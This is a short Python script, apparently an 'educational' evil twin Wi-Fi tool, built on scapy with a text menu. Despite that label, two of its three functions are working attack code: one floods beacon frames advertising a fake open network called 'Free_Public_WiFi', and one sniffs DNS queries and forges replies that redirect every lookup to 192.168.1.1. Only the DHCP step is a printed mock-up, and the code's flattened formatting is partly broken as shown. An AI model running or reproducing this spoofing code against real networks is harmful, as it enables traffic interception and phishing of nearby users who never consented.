
WiFi-EvilTwin-Emulator - main.py

Educational Evil Twin Simulation Tool

import os import sys import time from scapy.all import *

INTERFACE = "wlan0mon"  # Adjust to your wireless interface in monitor mode FAKE_SSID = "Free_Public_WiFi"

--- Step 1: Beacon Frame Broadcaster ---

def send_beacon(): dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC()) beacon = Dot11Beacon(cap="ESS") essid = Dot11Elt(ID="SSID", info=FAKE_SSID, len=len(FAKE_SSID)) frame = RadioTap()/dot11/beacon/essid

print(f"[+] Broadcasting fake SSID: {FAKE_SSID}")
while True:
    sendp(frame, iface=INTERFACE, inter=0.1, loop=0, verbose=0)

--- Step 2: Simulate DHCP ACK Responses (Fake) ---

def simulate_dhcp(): print("[!] Simulating DHCP server (visual only — not functional)") time.sleep(3) print("[+] Assigned IP: 192.168.1.100") print("[+] Gateway: 192.168.1.1") print("[+] DNS Server: 192.168.1.1")

--- Step 3: Fake DNS Spoofing Demo ---

def dns_spoof(packet): if packet.haslayer(DNSQR): spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/
UDP(dport=packet[UDP].sport, sport=53)/
DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="192.168.1.1")) send(spoofed_pkt, verbose=0) print(f"[+] Spoofed DNS response for {packet[DNSQR].qname.decode()}")

--- Main Menu ---

def main(): print(""" ===================================== WiFi Evil Twin Emulator - Sinan Alungal ===================================== """) print("1. Start Fake AP (Beacon Flood)") print("2. Simulate DHCP Assignment") print("3. DNS Spoofing (demo)") print("4. Exit")

choice = input("Select an option: ")

if choice == "1":
    send_beacon()
elif choice == "2":
    simulate_dhcp()
elif choice == "3":
    sniff(filter="udp port 53", prn=dns_spoof, store=0)
else:
    sys.exit("Goodbye!")

if name == "main": main()

